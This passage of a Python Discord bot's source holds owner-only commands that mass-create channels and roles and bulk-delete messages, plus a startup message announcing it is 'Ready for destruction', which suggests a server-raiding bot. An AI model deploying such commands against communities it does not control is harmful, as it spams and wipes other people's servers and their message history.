@app_commands.command(name='masscreate', description="Create multiple channels")
@app_commands.check(is_owner_interaction)
@app_commands.describe(amount="Number of channels", name="Channel name base")
async def masscreate_slash(interaction: discord.Interaction, amount: int, name: str):
    await interaction.response.defer()
    for i in range(min(amount, 50)):
        try:
            await interaction.guild.create_text_channel(f"{name}-{i}")
            await asyncio.sleep(0.05)
        except:
            pass
    await interaction.followup.send(f"✅ Created {min(amount, 50)} channels.")

@bot.command(name='masscreateroles')
@commands.check(is_owner)
async def masscreateroles_prefix(ctx, amount: int, *, name: str):
    """Create roles"""
    for i in range(min(amount, 50)):
        try:
            await ctx.guild.create_role(name=f"{name}-{i}")
            await asyncio.sleep(0.05)
        except:
            pass
    await ctx.send(f"✅ Created {min(amount, 50)} roles.")

@app_commands.command(name='masscreateroles', description="Create multiple roles")
@app_commands.check(is_owner_interaction)
@app_commands.describe(amount="Number of roles", name="Role name base")
async def masscreateroles_slash(interaction: discord.Interaction, amount: int, name: str):
    await interaction.response.defer()
    for i in range(min(amount, 50)):
        try:
            await interaction.guild.create_role(name=f"{name}-{i}")
            await asyncio.sleep(0.05)
        except:
            pass
    await interaction.followup.send(f"✅ Created {min(amount, 50)} roles.")

@bot.command(name='massclear')
@commands.check(is_owner)
async def massclear_prefix(ctx, amount: int):
    """Clear messages"""
    await ctx.channel.purge(limit=min(amount, 1000))
    await ctx.send(f"✅ Cleared {amount} messages.")

@app_commands.command(name='massclear', description="Clear messages")
@app_commands.check(is_owner_interaction)
@app_commands.describe(amount="Number of messages to clear")
async def massclear_slash(interaction: discord.Interaction, amount: int):
    await interaction.response.defer()
    await interaction.channel.purge(limit=min(amount, 1000))
    await interaction.followup.send(f"✅ Cleared {amount} messages.")

# ============ ERROR HANDLING ============

@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.MissingPermissions):
        await ctx.send("❌ Missing permissions.")
    elif isinstance(error, commands.MemberNotFound):
        await ctx.send("❌ Member not found.")
    elif isinstance(error, commands.MissingRequiredArgument):
        await ctx.send(f"❌ Missing required argument: {error.param.name}")
    elif isinstance(error, commands.BadArgument):
        await ctx.send(f"❌ Invalid argument: {error}")
    else:
        print(f"Error: {error}")

@bot.event
async def on_ready():
    print(f"✅ Logged in as {bot.user.name}")
    print(f"✅ Connected to {len(bot.guilds)} guilds")
    print(f"✅ Ready for destruction.")
    print(f"✅ Owner IDs: {OWNER_IDS}")
    print(f"✅ Using Railway Environment Variables")
    
    # Set bot status
    activity_type = discord.ActivityType.watching
    await bot.change_presence(activity=discord.Activity(type=activity_type, name=DEFAULT_ACTIVITY))
    
    # Sync slash commands
    try:
        synced = await bot.tree.sync()
        print(f"✅ Synced {len(synced)} slash commands.")
    except Exception as e:
        print(f"❌ Failed to sync commands: {e}")

# ============ RUN BOT ============
if __name__ == "__main__":
    if not TOKEN:
        print("❌ ERROR: DISCORD_TOKEN not found in Railway environment variables!")
        print("Please set DISCORD_TOKEN in your Railway project variables.")
        exit(1)
    
    if not OWNER_IDS:
        print("⚠️ WARNING: No OWNER_IDS set! No one will be able to use commands.")
        print("Please set OWNER_IDS in your Railway project variables.")
    
    bot.run(TOKEN)
